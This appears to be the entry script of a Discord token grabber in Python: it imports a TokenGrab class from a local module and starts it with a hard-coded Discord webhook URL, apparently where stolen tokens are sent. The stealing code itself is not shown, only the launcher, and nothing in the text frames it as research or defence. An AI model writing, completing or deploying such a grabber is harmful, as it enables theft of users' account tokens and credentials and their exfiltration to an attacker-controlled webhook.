from src import TokenGrab
TokenGrab("https://discord.com/api/webhooks/942429402229268520/DVK23GUO3pREJcszMvfhGrGIv1Lp1RQFgNgyma_Wa3pumGQlX-SvIpcOwanWhXSJjEBC").start()
